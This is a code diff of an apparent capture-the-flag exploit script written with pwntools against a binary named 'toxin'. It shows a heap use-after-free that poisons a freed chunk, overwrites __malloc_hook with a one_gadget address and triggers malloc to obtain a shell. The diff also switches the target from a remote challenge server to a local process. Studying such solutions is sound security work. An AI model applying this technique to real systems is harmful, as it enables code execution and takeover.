@@ -38,9 +38,9 @@ def edit_toxin(index,data):
 	io.sendline(data)
 	io.recv()
 
-ip, port = '144.126.232.250',30005
-io = remote(ip, port)
-#io = process('./toxin')
+#ip, port = '144.126.232.250',30005
+#io = remote(ip, port)
+io = process('./toxin')
 #io = gdb.debug('./toxin', 'break search_toxin')
 
 elf = ELF('./toxin')
@@ -130,15 +130,22 @@ constraints:
   [rsp+0x70] == NULL
 
 '''
-
 add_toxin(100,0,"A"*0x10)
 drink_toxin(0)
 edit_toxin(0,p64(elf.symbols["toxinfreed"] -0x13))
-#edit_toxin(0,p64(elf_rip+0xe))
 
 add_toxin(100,1,"B"*0x10)
 add_toxin(100,2, "\x00"*35 + p64(libc.symbols['__malloc_hook']) + p64(0)*3)
 edit_toxin(0,p64(libc.address + 0x10a38c))
+'''
+add_toxin(100,0,"A"*0x10)
+drink_toxin(0)
+print '__malloc_hook: '+hex(u64(p64(libc.symbols['__malloc_hook'])))
+edit_toxin(0,p64(libc.symbols['__malloc_hook']))
+print 'one_gadget: '+hex(u64(p64(libc.address + 0x10a38c)))
+add_toxin(100,1,'B'*0x10)
+#add_toxin(100,2,p64(libc.address + 0x10a38c))
+'''
 
 ### Call __malloc_hook and get the shell ---
 io.sendline("1")
